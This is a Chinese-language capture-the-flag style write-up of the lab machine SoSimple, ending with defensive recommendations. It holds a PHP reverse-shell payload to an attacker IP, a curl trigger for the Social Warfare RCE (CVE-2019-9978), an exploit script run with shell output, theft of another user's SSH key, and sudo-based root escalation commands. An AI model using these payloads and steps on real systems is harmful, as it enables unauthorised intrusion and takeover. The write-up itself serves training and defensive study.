# SoSimple 靶機滲透測試紀錄

> [!info] **靶機基本資訊**
> - **平台**：OffSec Proving Grounds (Play)
> - **作業系統**：linux
> - **難易度**：easy
> - **開始時間**：2026-07-02

---

## 🔍 1. 偵察與列舉 (Reconnaissance & Enumeration)

### 🚀 快速連接埠掃描 (Nmap)
使用 Nmap 定位開放的連接埠與服務：
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 192.168.192.78 -- -sV

..........

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 61 OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 61 Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

**掃描結果整理：**

| 連接埠 (Port) | 服務 (Service) | 版本 (Version) | 備註 / 潛在漏洞點 |
| ---------- | ------------ | ------------ | ---------- |
| 22/tcp     | SSH          | OpenSSH 8.2p1 Ubuntu | 遠端管理服務。 |
| 80/tcp     | HTTP         | Apache httpd 2.4.41 | 網頁伺服器，本題主要攻擊面。 |

---

### 🌐 網頁服務列舉 (Web Enumeration)
確認目標網站背後運行的是 **WordPress** CMS 系統。

在進行目錄與敏感路徑爆破（如使用 `gobuster` 或 `feroxbuster`）時，掃描結果中暴露了 WordPress 標誌性的目錄結構與特有路徑：
*   `/wp-admin/` (管理後台)
*   `/wp-content/` (外掛與主題目錄)
*   `/wp-login.php` (登入頁面)
```bash
┌──(kali㉿kali)-[~/Downloads]
└─$ feroxbuster -u http://192.168.192.78/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html -t 50 -d 2 -s 200

........

200      GET      384l     3177w    19915c http://192.168.192.78/wordpress/license.txt
200      GET       13l       78w     4373c http://192.168.192.78/wordpress/wp-admin/images/wordpress-logo.png
200      GET      391l      778w     6147c http://192.168.192.78/wordpress/wp-admin/css/install.css
200      GET       87l      302w     5246c http://192.168.192.78/wordpress/wp-login.php
200      GET       17l       85w     1421c http://192.168.192.78/wordpress/wp-admin/install.php
200      GET       26l       93w     1526c http://192.168.192.78/wordpress/wp-admin/upgrade.php
200      GET        0l        0w        0c http://192.168.192.78/wordpress/wp-config.php
200      GET        0l        0w        0c http://192.168.192.78/wordpress/wp-blog-header.php
200      GET        0l        0w        0c http://192.168.192.78/wordpress/wp-cron.php
200      GET        0l        0w        0c http://192.168.192.78/wordpress/wp-load.php
200      GET       11l       27w      240c http://192.168.192.78/wordpress/wp-links-opml.php
200      GET        5l       15w      135c http://192.168.192.78/wordpress/wp-trackback.php
200      GET       97l      823w     7278c http://192.168.192.78/wordpress/readme.html
```

確認其 CMS 系統為 WordPress 後，即可針對該平台使用專門的掃描工具 `wpscan` 進行深度的使用者列舉與外掛漏洞探測。

#### 📁 使用者與漏洞掃描 (Wpscan)
使用 `wpscan` 列舉系統中的使用者與外掛。由於此 WordPress 架設在 `/wordpress/` 子目錄下且可能有偵測限制，在執行掃描時需要指定完整子目錄路徑並加上 `--force` 參數強制執行：
*   **發現的使用者**：`admin`、`max`
	```bash
	# 列舉 WordPress 使用者 (指定子路徑並加上 --force 強制執行)
	┌──(kali㉿kali)-[~/Downloads]
	└─$ wpscan --url http://192.168.192.78/wordpress/ -e u --force
	
	.........
	
	[i] User(s) Identified:
	
	[+] admin
	 | Found By: Author Posts - Author Pattern (Passive Detection)
	 | Confirmed By:
	 |  Rss Generator (Passive Detection)
	 |  Wp Json Api (Aggressive Detection)
	 |   - http://192.168.192.78/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
	 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 |  Login Error Messages (Aggressive Detection)
	
	[+] max
	 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
	 | Confirmed By: Login Error Messages (Aggressive Detection)
	
	..........
	```

*   **發現的漏洞外掛**：`Social Warfare 3.5.0`
	```bash
	# 進行外掛掃描 (加上 --force 強制執行)
	┌──(kali㉿kali)-[~/Downloads]
	└─$ wpscan --url http://192.168.192.78/wordpress/ -e ap --force
	
	.........
	
	[i] Plugin(s) Identified:
	
	[+] simple-cart-solution
	 | Location: http://192.168.192.78/wordpress/wp-content/plugins/simple-cart-solution/
	 | Last Updated: 2022-04-17T20:50:00.000Z
	 | [!] The version is out of date, the latest version is 1.0.2
	 |
	 | Found By: Urls In Homepage (Passive Detection)
	 |
	 | Version: 0.2.0 (100% confidence)
	 | Found By: Query Parameter (Passive Detection)
	 
	 ........
	 
	 [+] social-warfare
	 | Location: http://192.168.192.78/wordpress/wp-content/plugins/social-warfare/
	 | Last Updated: 2025-03-18T09:37:00.000Z
	 | [!] The version is out of date, the latest version is 4.5.6
	 |
	 | Found By: Urls In Homepage (Passive Detection)
	 | Confirmed By: Comment (Passive Detection)
	 |
	 | Version: 3.5.0 (100% confidence)
	 | Found By: Comment (Passive Detection)
	 
	 ........
	```

---

## ⚡ 2. 漏洞分析與初始存取 (Vulnerability Analysis & Initial Access)

### 🕵️ 漏洞分析 (Vulnerability Assessment)
WordPress 的 **Social Warfare** 外掛版本過舊（當前版本為 3.5.0，小於 3.5.3），存在著名的遠端代碼執行（RCE）漏洞（CVE-2019-9978）。

此漏洞源於 `swp_url` 參數沒有對傳入的外部連結進行安全過濾，這使得攻擊者可以在外部伺服器上託管含有惡意 PHP 代碼的文字檔案，並讓目標伺服器讀取並執行它。

---

### 🔑 初始存取突破 (Exploitation)

#### 1. 漏洞利用取得 www-data Shell
1.  **在攻擊機上準備 payload 檔案**：
    在攻擊機的工作目錄中，建立一個名為 `payload.txt` 的檔案，寫入以下執行反彈 Shell 的 PHP 代碼：
    ```php
    <pre>system('bash -c "bash -i >& /dev/tcp/<KALI_IP>/4444 0>&1"')</pre>
    ```
2.  **開啟簡易 HTTP 伺服器託管 payload**：
    ```bash
    python3 -m http.server 8000
    ```
3.  **在攻擊機開啟 Netcat 監聽**：
    ```bash
    nc -lvnp 4444
    ```
4.  **觸發 RCE 漏洞**：
    使用 `curl` 存取目標主機上 Social Warfare 外掛的 `admin-post.php` 接口，傳入攻擊機所託管的惡意 payload URL：
    ```bash
    curl "http://192.168.x.x/wp-admin/admin-post.php?swp_url=http://<KALI_IP>:8000/payload.txt"
    ```
5.  **取得初始 Shell**：
    此時 Netcat 監聽端成功接收到連線，取得 `www-data` 的初始 Web Shell。

> [!NOTE] 補充：使用 searchsploit
> 除了手動建構 Payload，亦可透過 `searchsploit` 尋找現成的漏洞利用腳本（PoC）：
> 1. **搜尋漏洞**：使用 `searchsploit` 搜尋 `Social Warfare` 相關漏洞：
>    ```bash
>    ┌──(kali㉿kali)-[~/Downloads]
>    └─$ searchsploit Social Warfare  
>    ----------------------------------------------------------------------------------------- ---------------------------------
>     Exploit Title                                                                           |  Path
>    ----------------------------------------------------------------------------------------- ---------------------------------
>    Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)                      | multiple/webapps/52346.py
>    WordPress Plugin Social Warfare < 3.5.3 - Remote Code Execution                          | php/webapps/46794.py
>    ----------------------------------------------------------------------------------------- ---------------------------------
>    Shellcodes: No Results
>    ```
> 2. **下載 PoC**：將對應的漏洞利用腳本（例如 `52346`）複製至當前工作目錄：
>    ```bash
>    ┌──(kali㉿kali)-[~/Desktop/playground/SoSimple]
>    └─$ searchsploit -m 52346
>      Exploit: Social Warfare WordPress Plugin 3.5.2 - Remote Code Execution (RCE)
>          URL: https://www.exploit-db.com/exploits/52346
>         Path: /usr/share/exploitdb/exploits/multiple/webapps/52346.py
>        Codes: CVE-2019-9978
>     Verified: False
>    File Type: Python script, ASCII text executable
>    Copied to: /home/kali/Desktop/playground/SoSimple/52346.py
>    ```
> 3. **修改設定**：編輯下載的 `52346.py` 腳本，依目標環境與本地攻擊機資訊修改內部的設定區塊（Config）：
>    ```python
>    # --- Config ---
>    TARGET_URL = "http://192.168.192.78/wordpress/"  # Target WordPress URL
>    ATTACKER_IP = "192.168.45.206"                 # Change to your attack box IP
>    HTTP_PORT = 8000
>    LISTEN_PORT = 4444
>    PAYLOAD_FILE = "payload.txt"
>    ```
> 4. **執行攻擊**：執行修改後的 PoC 腳本，腳本將自動生成 payload 檔案、啟動本地 HTTP 伺服器進行託管、開啟連接埠監聽，並送出 Exploit。成功觸發 RCE 後即可取得 `www-data` 的互動式 Web Shell：
>    ```bash
>    ┌──(kali㉿kali)-[~/Desktop/playground/SoSimple]
>    └─$ python3 52346.py
>    [+] Payload written to payload.txt
>    [+] HTTP server running at port 8000
>    [+] Listening on port 4444 for reverse shell...
>    listening on [any] 4444 ...
>    [+] Sending exploit: http://192.168.192.78/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://192.168.45.206:8000/payload.txt
>    192.168.192.78 - - [02/Jul/2026 12:22:17] "GET /payload.txt?swp_debug=get_user_options HTTP/1.0" 200 -
>    connect to [192.168.45.206] from (UNKNOWN) [192.168.192.78] 58030
>    bash: cannot set terminal process group (954): Inappropriate ioctl for device
>    bash: no job control in this shell
>    www-data@so-simple:/var/www/html/wordpress/wp-admin$ whoami
>    whoami
>    www-data
>    ```

#### 2. 橫向移動取得 max 的 SSH 存取
取得 `www-data` 的權限後，開始收集本地資訊。我們發現在使用者 `max` 的家目錄中，其 SSH 私鑰檔案權限設定錯誤，對所有使用者皆為唯讀：
```bash
cat /home/max/.ssh/id_rsa
```
成功讀取 `id_rsa`。將私鑰內容複製回攻擊機，並設定安全的檔案權限（`600`）：
```bash
chmod 600 id_rsa
```
使用該私鑰成功透過 SSH 登入至靶機，獲得 `max` 的穩定互動 Shell：
```bash
ssh -i id_rsa max@192.168.x.x
```
此時可在 `/home/max/local.txt` 取得 User Flag。

---

## 📈 3. 特權提升 (Privilege Escalation)

### 🕵️ 橫向移動 (max -> steven)
以 `max` 身份登入後，使用 `sudo -l` 檢查當前使用者的 sudo 授權：
```bash
max@sosimple:~$ sudo -l
Matching Defaults entries for max on sosimple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User max may run the following commands on sosimple:
    (steven) NOPASSWD: /usr/sbin/service
```
`max` 可以不用密碼以 `steven` 權限執行 `/usr/sbin/service` 命令。

我們利用 `service` 調用相對路徑的 shell 來進行身份劫持：
```bash
sudo -u steven /usr/sbin/service ../../bin/bash
```
執行後成功將身份切換為 **`steven`**。

---

### 👑 垂直提權到 Root (steven -> root)
切換為 `steven` 使用者後，再次執行 `sudo -l` 檢查 Sudo 特權：
```bash
steven@sosimple:~$ sudo -l
Matching Defaults entries for steven on sosimple:
    env_reset, mail_badpass, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin

User steven may run the following commands on sosimple:
    (root) NOPASSWD: /opt/tools/server-health.sh
```
`steven` 可以免密碼以 `root` 權限執行 `/opt/tools/server-health.sh`。

當我們深入探查該路徑時，發現 `/opt/` 目錄下**根本不存在** `tools/` 資料夾以及 `server-health.sh` 腳本。然而，`steven` 對於 `/opt/` 目錄擁有寫入權限。這意味著我們可以自行建立該腳本，藉以實現 root 權限的代碼執行。

#### 1. 建立腳本與目錄
```bash
mkdir -p /opt/tools
echo -e '#!/bin/bash\n/bin/bash -p' > /opt/tools/server-health.sh
chmod +x /opt/tools/server-health.sh
```

#### 2. 執行 Sudo 提權
直接執行允許的特權腳本：
```bash
sudo /opt/tools/server-health.sh
```
因為系統以 `root` 身份執行該腳本，而腳本中的 `/bin/bash -p` 會被呼叫，我們隨即成功進入 root 的互動 Shell，並在 `/root/proof.txt` 取得 Flag。
```bash
root@sosimple:~# whoami
root
```

---

## 💡 4. 心得與學習點 (Key Takeaways)

1. **為什麼這些漏洞會存在？**
   - **不安全的外掛**：使用了版本過舊且具有高危 RCE 漏洞的 WordPress 插件。
   - **SSH 敏感私鑰保護不周**：將使用者的 SSH 私鑰檔案權限設定過於寬鬆（所有使用者可讀），導致橫向移動。
   - **Sudo 授權不當（GTFOBins 漏洞與路徑缺失）**：
     - 給予普通使用者執行 `service` 這類可以繞過路徑執行 Shell 的管理工具。
     - 允許以 Root 執行一個「不存在但使用者可控其目錄」的腳本路徑，使得提權輕而易舉。

2. **安全防禦建議：**
   - 定期更新所有 WordPress 及其插件，停用不必要的外掛。
   - 將使用者的私鑰檔限縮權限為 `600`，只允許 Owner 讀寫，並移除家目錄的 world-readable 權限。
   - 審查並限縮 `/etc/sudoers` 權限，避免對 `service` 等容易逃逸的命令授權；且確保所有 sudo 允許執行的腳本路徑均已正確防護且只有 root 唯讀寫。
